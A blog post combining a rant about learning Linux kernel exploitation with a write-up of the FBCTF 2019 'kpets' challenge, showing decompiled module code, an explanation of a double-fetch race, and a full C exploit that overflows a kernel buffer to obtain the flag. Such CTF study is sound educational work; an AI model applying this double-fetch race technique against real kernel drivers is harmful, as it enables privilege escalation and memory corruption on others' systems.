<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>A Long Rant and FBCTF 2019 - kpets | circleous</title><link rel=stylesheet href=/css/main.min.480e0ef6c6aac53eaf38419259058419b9323d67397f61cf2d8ce892d869c560.css integrity="sha256-SA4O9saqxT6vOEGSWQWEGbkyPWc5f2HPLYzokthpxWA=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>A Long Rant and FBCTF 2019 - kpets</h1><time datetime=2019-06-29T00:00:00+07:00>June 29, 2019</time></header><h2 id=rant>rant</h2><p>After reading auxy blog about <a href=http://www.auxy.xyz/tutorial/2019/06/10/Linux-Exp-Tutorial.html>linux kernel exploitation tutorial</a>, I kinda wanted to write this into a blog post. I&rsquo;m still rather new to kernel pwn, I&rsquo;ve been learning this since there is two kernel pwn appearances in secfest CTF around May 2019 <code>xtore</code> and <code>brainfuck64</code>. Reason? I need something beside learning classical heap pwn and might be a good mood booster to do another large codebase code review.</p><p><code>brainfuck64</code> seems like a classic heap challenge, but in kernelspace. I didn&rsquo;t solve it tho, I literally just started this kernel pwn journey and didn&rsquo;t even know what&rsquo;s this <code>IOCTL</code> thing. Shortly, after ctf ends, I read <a href=https://kileak.github.io/ctf/2019/secfest-brainfuck64/>kileak writeup</a>, seems like my assumption is correct.</p><p><code>xtore</code>, this is actually a blatant copy from <a href=https://www.root-me.org/en/Challenges/App-System/LinKern-ARM-Stack-Overflow>one of Root-Me.org kernel challenge</a> (I haven&rsquo;t solved this one at that time). Reversing the kernel module actually doesn&rsquo;t give you many attack surface, not even race or overflow exists™ or is it(?). The flaw actually is in this recursive function where it copy a chunk user buffer to kernel stack at a time, when the buffer given larger than the chunk, it calls itself to continue copy the chunk from last chunk position and continue to call recursively until all buffer copied. This is fine as it sounds, but the kernel stack actually doesn&rsquo;t have many room, only 8KB (2 memory pages), this could be a problem when a function uses too much stack memory or called <strong>recursively</strong>. This attack actually called <code>stack overflow</code>, where stack could grow to top address and over run thread_info. Writeup from teammate at OpenToAll, vakkz devcraft.io, <a href=https://devcraft.io/2019/05/28/xtore-security-fest-2019.html>xtore - Security Fest 2019</a>. Some light reading about this <code>Stack Overflow</code>, <a href=http://phrack.org/issues/64/6.html#article>phrack64 - Attacking the Core: Kernel Exploitation Notes</a> and <a href=https://jon.oberheide.org/files/infiltrate12-thestackisback.pdf>Jon Oberheide - The Stack is Back</a>.</p><p>I&rsquo;m playing with PDKT in FBCTF 2019, which has 1 challenge rhyme with my current learning curve, kpets, an easy-medium kernel challenge which I didn&rsquo;t solve in time, TL;DR It&rsquo;s a double-fetch where we could create race condition and make kernel copy more buffer than allocated. More detailed writeup continued below, where I&rsquo;ll explain some failed attack ideas and dumb assumption where lead me into not solving this in time.</p><h2 id=desc>desc</h2><blockquote><p>We wrote a pet store application that was too slow, so we made a kernel module for it instead.</p><p>nc 134.209.40.42 1337</p><p>(Note: connecting to the problem mentions something about spectre. That&rsquo;s not the intended solution, but whatever works for you. Also when connecting to remote you can provide a URL to a VALID ELF FILE which will be downloaded and placed into the QEMU image to save you copying base64. This binary MUST BE an ELF and &lt; 1MB</p><p>Author: pippinthedog</p><p>resource: <a href=https://github.com/fbsamples/fbctf-2019-challenges/tree/master/pwnables/kpets>kpets</a></p></blockquote><h2 id=rev>rev</h2><p>From reversing the kernel module we could know that it creates device at <code>/dev/kpets</code>. As the desc implies, this is &ldquo;a pet store&rdquo; that live in kernel space and this <code>/dev/kpets</code> is an interface to the pet store. Also, from reversing this, there&rsquo;s an important struct which will be used in this interface.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>struct</span> kpets {
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> type;
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> name_len;
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> name[<span style=color:#e0af68>0x20</span>];
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> desc_len;
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> desc[<span style=color:#e0af68>0x40</span>];
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><h3 id=get-the-flag>get the flag</h3><p>To get the flag, we need to create a <code>kpets</code> with <code>kpets->type == '\xAA'</code> and read <code>/dev/kpets</code> to get flag buffer.</p><h3 id=create-kpet>create kpet</h3><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>__int64</span> <span style=color:#bb9af7>__fastcall</span> <span style=color:#7aa2f7>dev_write</span>(<span style=color:#bb9af7>__int64</span> a1, kpets <span style=color:#9ece6a;font-weight:700>*</span>kpets_from_user, <span style=color:#bb9af7>__int64</span> a3)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> id; <span style=color:#414868;font-style:italic>// eax
</span></span></span><span style=display:flex><span>  kpets <span style=color:#9ece6a;font-weight:700>*</span>kpets_id_ptr; <span style=color:#414868;font-style:italic>// rbx
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>v5; <span style=color:#414868;font-style:italic>// r14
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>v6; <span style=color:#414868;font-style:italic>// rdi
</span></span></span><span style=display:flex><span>  <span style=color:#bb9af7>__int64</span> v8; <span style=color:#414868;font-style:italic>// [rsp+0h] [rbp-40h]
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> type; <span style=color:#414868;font-style:italic>// [rsp+Bh] [rbp-35h]
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> kpets_from_user_name_len; <span style=color:#414868;font-style:italic>// [rsp+Ch] [rbp-34h]
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> kpets_from_user_desc_len; <span style=color:#414868;font-style:italic>// [rsp+10h] [rbp-30h]
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> kpets_from_user_name_len_2; <span style=color:#414868;font-style:italic>// [rsp+14h] [rbp-2Ch]
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> v13; <span style=color:#414868;font-style:italic>// [rsp+18h] [rbp-28h]
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  v8 <span style=color:#9ece6a;font-weight:700>=</span> a3;
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>copy_from_user</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user_name_len, <span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user<span style=color:#9ece6a;font-weight:700>-&gt;</span>name_len, <span style=color:#e0af68>4LL</span>);
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> ( kpets_from_user_name_len <span style=color:#9ece6a;font-weight:700>&gt;</span> <span style=color:#e0af68>0x20</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a>&#34;kpets: invalid pet name len: 0x%02x</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> v8;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>copy_from_user</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user_desc_len, <span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user<span style=color:#9ece6a;font-weight:700>-&gt;</span>desc_len, <span style=color:#e0af68>4LL</span>);
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> ( kpets_from_user_desc_len <span style=color:#9ece6a;font-weight:700>&gt;</span> <span style=color:#e0af68>0x40</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a>&#34;kpets: invalid pet description len: 0x%02x</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> v8;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// maybe find first empty slot??
</span></span></span><span style=display:flex><span>  id <span style=color:#9ece6a;font-weight:700>=</span> max_pets <span style=color:#9ece6a;font-weight:700>-</span> <span style=color:#e0af68>1</span>;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> ( (<span style=color:#41a6b5>int</span>)max_pets <span style=color:#9ece6a;font-weight:700>-</span> <span style=color:#e0af68>1</span> <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#e0af68>0</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> ( (_DWORD)max_pets )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      kpets_id_ptr <span style=color:#9ece6a;font-weight:700>=</span> (kpets <span style=color:#9ece6a;font-weight:700>*</span>)first_slot;
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>goto</span> LABEL_9;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>else</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    kpets_id_ptr <span style=color:#9ece6a;font-weight:700>=</span> (kpets <span style=color:#9ece6a;font-weight:700>*</span>)first_slot;
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> ( <span style=color:#9ece6a;font-weight:700>!*</span>(_BYTE <span style=color:#9ece6a;font-weight:700>*</span>)first_slot )
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>goto</span> LABEL_9;
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>while</span> ( <span style=color:#e0af68>1</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#9ece6a;font-weight:700>--</span>id;
</span></span><span style=display:flex><span>      <span style=color:#9ece6a;font-weight:700>--</span>kpets_id_ptr;
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>if</span> ( id <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#9ece6a;font-weight:700>-</span><span style=color:#e0af68>1</span> )
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>if</span> ( <span style=color:#9ece6a;font-weight:700>!</span><span style=color:#7aa2f7>LOBYTE</span>(kpets_id_ptr<span style=color:#9ece6a;font-weight:700>-&gt;</span>type) )
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>goto</span> LABEL_9;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  kpets_id_ptr <span style=color:#9ece6a;font-weight:700>=</span> (kpets <span style=color:#9ece6a;font-weight:700>*</span>)first_slot;
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>memset</span>(chunk, <span style=color:#e0af68>0</span>, chunk_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// IDK
</span></span></span><span style=display:flex><span><span style=color:#9ece6a>LABEL_9</span>:
</span></span><span style=display:flex><span>  v5 <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>)<span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user_name_len_2;
</span></span><span style=display:flex><span>  kpets_from_user_name_len_2 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>do</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v6 <span style=color:#9ece6a;font-weight:700>=</span> v5<span style=color:#9ece6a;font-weight:700>++</span>;
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>get_random_bytes</span>(v6, <span style=color:#e0af68>1LL</span>);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>msleep</span>(<span style=color:#e0af68>1LL</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>while</span> ( v5 <span style=color:#9ece6a;font-weight:700>!=</span> <span style=color:#9ece6a;font-weight:700>&amp;</span>v13 );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a>&#34;kpets: your new pet owner is %s!&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>copy_from_user</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>type, kpets_from_user, <span style=color:#e0af68>1LL</span>);
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> ( (<span style=color:#41a6b5>unsigned</span> <span style=color:#bb9af7>__int8</span>)(type <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>64</span>) <span style=color:#9ece6a;font-weight:700>&gt;</span> <span style=color:#e0af68>1u</span> <span style=color:#9ece6a;font-weight:700>&amp;&amp;</span> type <span style=color:#9ece6a;font-weight:700>!=</span> <span style=color:#e0af68>0xC2u</span> ) <span style=color:#414868;font-style:italic>// Check for valid type
</span></span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a>&#34;kpets: invalid pet type: 0x%02hhx</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>else</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>copy_from_user</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user_name_len_2, <span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user<span style=color:#9ece6a;font-weight:700>-&gt;</span>name_len, <span style=color:#e0af68>4LL</span>);<span style=color:#414868;font-style:italic>// second fetch!!!
</span></span></span><span style=display:flex><span>    <span style=color:#7aa2f7>LOBYTE</span>(kpets_id_ptr<span style=color:#9ece6a;font-weight:700>-&gt;</span>type) <span style=color:#9ece6a;font-weight:700>=</span> type;
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>copy_from_user</span>(kpets_id_ptr<span style=color:#9ece6a;font-weight:700>-&gt;</span>name, kpets_from_user<span style=color:#9ece6a;font-weight:700>-&gt;</span>name, kpets_from_user_name_len_2);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>copy_from_user</span>(kpets_id_ptr<span style=color:#9ece6a;font-weight:700>-&gt;</span>desc, kpets_from_user<span style=color:#9ece6a;font-weight:700>-&gt;</span>desc, kpets_from_user_desc_len);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> v8;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>To create <code>kpet</code>, we could write a <code>kpets</code> struct to <code>/dev/kpets</code>. There&rsquo;s some check in place, 1. <code>kpet->name_len &lt; 32</code> 2. <code>kpet->desc_len &lt; 64</code> 3. <code>kpet->type</code> must be a valid type <code>'\xC0'</code> - <code>'\xC2'</code></p><h3 id=read-kpets>read kpets</h3><p>To read kpets, we could read <code>/dev/kpets</code> and see output from <code>dmesg</code> since the output is printed with <code>printk</code>.</p><h2 id=attacc>attacc</h2><p>The vulnerability is in <code>dev_write</code>, where it tries to fetch 2 times at a user buffer (hence the double fetch).</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#7aa2f7>copy_from_user</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user_name_len, <span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user<span style=color:#9ece6a;font-weight:700>-&gt;</span>name_len, <span style=color:#e0af68>4LL</span>);
</span></span><span style=display:flex><span><span style=color:#bb9af7>if</span> ( kpets_from_user_name_len <span style=color:#9ece6a;font-weight:700>&gt;</span> <span style=color:#e0af68>0x20</span> ) {
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// die
</span></span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#7aa2f7>copy_from_user</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user_name_len_2, <span style=color:#9ece6a;font-weight:700>&amp;</span>kpets_from_user<span style=color:#9ece6a;font-weight:700>-&gt;</span>name_len, <span style=color:#e0af68>4LL</span>); <span style=color:#414868;font-style:italic>// second fetch!!!
</span></span></span><span style=display:flex><span><span style=color:#7aa2f7>copy_from_user</span>(kpets_id_ptr<span style=color:#9ece6a;font-weight:700>-&gt;</span>name, kpets_from_user<span style=color:#9ece6a;font-weight:700>-&gt;</span>name, kpets_from_user_name_len_2);
</span></span></code></pre></div><p>To exploit this we could use race condition to create change <code>kpets->name_len</code> just enough to bypass the first check and overflow the buffer. Remember that we only need to create the <code>kpet->type == '\xAA'</code> to get the flag? we could just overwrite the next <code>kpet->type</code> to <code>0xAA</code> using overflow on current <code>kpet->name</code> buffer.</p><h2 id=exploit>exploit</h2><p>Rather than explaining the exploit method, here a commented source code.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#414868;font-style:italic>#define _GNU_SOURCE
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;fcntl.h&gt;</span><span style=color:#414868;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;string.h&gt;</span><span style=color:#414868;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;unistd.h&gt;</span><span style=color:#414868;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#414868;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;pthread.h&gt;</span><span style=color:#414868;font-style:italic>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#define KDOG   0xC0
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#define KCAT   0xC1
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#define KSHEEP 0xC2
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#define KFLAG  0xAA
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>typedef</span> <span style=color:#bb9af7>struct</span> kpets {
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> type;
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> name_len;
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> name[<span style=color:#e0af68>0x20</span>];
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> desc_len;
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> desc[<span style=color:#e0af68>0x41</span>]; <span style=color:#414868;font-style:italic>// overwrite next-&gt;type
</span></span></span><span style=display:flex><span>} kpets;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>static</span> <span style=color:#41a6b5>int</span> fd;
</span></span><span style=display:flex><span><span style=color:#bb9af7>static</span> kpets<span style=color:#9ece6a;font-weight:700>*</span> pet;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>static</span> <span style=color:#41a6b5>void</span> <span style=color:#9ece6a;font-weight:700>*</span><span style=color:#7aa2f7>evil_thread</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>/*
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>   * This will change the name_len between 0 and 0x65 forever,
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>   * current-&gt;name[0x20] + current-&gt;desc_len[0x4] +
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>   * current-&gt;desc[0x40] + next-&gt;type[0x1] == 0x65, and hope
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>   * that 0 will hit the first length check and 0x65 when hit
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>   * the second fetch and surely overwrite our next kpet-&gt;type
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>   */</span>
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>for</span>(;;) pet<span style=color:#9ece6a;font-weight:700>-&gt;</span>name_len <span style=color:#9ece6a;font-weight:700>^=</span> <span style=color:#e0af68>0x65</span>;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#9ece6a>NULL</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>main</span>(<span style=color:#41a6b5>int</span> argc, <span style=color:#41a6b5>char</span> <span style=color:#bb9af7>const</span> <span style=color:#9ece6a;font-weight:700>*</span>argv[]) {
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>pthread_t</span> pth1;
</span></span><span style=display:flex><span>  kpets kpet;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> buf[<span style=color:#e0af68>256</span>];
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>memset</span>(buf, <span style=color:#e0af68>0</span>, <span style=color:#bb9af7>sizeof</span>(buf));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  fd <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>open</span>(<span style=color:#9ece6a>&#34;/dev/kpets&#34;</span>, O_RDWR);
</span></span><span style=display:flex><span>  pet <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a;font-weight:700>&amp;</span>kpet;
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>memset</span>(pet, <span style=color:#e0af68>0</span>, <span style=color:#bb9af7>sizeof</span>(kpets));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  pet<span style=color:#9ece6a;font-weight:700>-&gt;</span>type <span style=color:#9ece6a;font-weight:700>=</span> KDOG;
</span></span><span style=display:flex><span>  pet<span style=color:#9ece6a;font-weight:700>-&gt;</span>name_len <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>  pet<span style=color:#9ece6a;font-weight:700>-&gt;</span>desc_len <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>  pet<span style=color:#9ece6a;font-weight:700>-&gt;</span>desc[<span style=color:#e0af68>0x40</span>] <span style=color:#9ece6a;font-weight:700>=</span> KFLAG;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// Run a separate thread to race
</span></span></span><span style=display:flex><span>  <span style=color:#7aa2f7>pthread_create</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>pth1, <span style=color:#9ece6a>NULL</span>, evil_thread, <span style=color:#9ece6a>NULL</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>write</span>(fd, pet, <span style=color:#e0af68>0x6C</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>for</span> (;;) {
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>write</span>(fd, pet, <span style=color:#e0af68>0x6C</span>);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>read</span>(fd, buf, <span style=color:#bb9af7>sizeof</span>(buf));
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic>// If there&#39;s a non-null bytes in our buffer from
</span></span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic>// our read, it means we succeed to get the flag
</span></span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> (buf[<span style=color:#e0af68>0</span>]) {
</span></span><span style=display:flex><span>      <span style=color:#7aa2f7>write</span>(<span style=color:#e0af68>1</span>, buf, <span style=color:#bb9af7>sizeof</span>(buf));we
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Runinng this on server, we immediately get the flag,</p><pre><code>fb{lets_try_that_again__double_the_fetch_for_double_the_fun}
</code></pre><h2 id=failed-attack-ideas>failed attack ideas</h2><p>slow branch condition</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>for</span>(;;) pet<span style=color:#9ece6a;font-weight:700>-&gt;</span>name_len <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x64</span> <span style=color:#9ece6a;font-weight:700>+</span> (<span style=color:#7aa2f7>rand</span>() <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>1</span>);
</span></span></code></pre></div><p>notice that I&rsquo;m using XOR on name_len to create where it changes between 0 and 0x65, but here I thought just change the value using branch condition would succeed, but that&rsquo;s not gonna happen. I&rsquo;ve tried to change the <code>rand()</code> to a static random buffer read from &lsquo;/dev/urandom&rsquo; and that failed too. At this point, I thought maybe there&rsquo;s something todo with the qemu start script where it has <code>thread=1</code> option,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>qemu-system-x86_64 <span style=color:#7aa2f7>\
</span></span></span><span style=display:flex><span>    -m 64M -smp 1,cores<span style=color:#9ece6a;font-weight:700>=</span>1,threads<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>1</span> <span style=color:#7aa2f7>\
</span></span></span><span style=display:flex><span>    --enable-kvm <span style=color:#7aa2f7>\
</span></span></span><span style=display:flex><span>    -kernel $1 <span style=color:#7aa2f7>\
</span></span></span><span style=display:flex><span>    -nographic <span style=color:#7aa2f7>\
</span></span></span><span style=display:flex><span>    -append <span style=color:#9ece6a>&#34;console=ttyS0 noapic quiet&#34;</span> <span style=color:#7aa2f7>\
</span></span></span><span style=display:flex><span>    -initrd $2 <span style=color:#7aa2f7>\
</span></span></span><span style=display:flex><span>    -monitor /dev/null -s
</span></span></code></pre></div><p>thus, I started to find another attack surface for this since I thought race condition isn&rsquo;t an option here (and… well.. It fails miserably). sad.</p><div><div>Tags:</div><ul><li><a href=/tags/rant/>Rant</a></li><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/pwn/>Pwn</a></li><li><a href=/tags/kernel/>Kernel</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>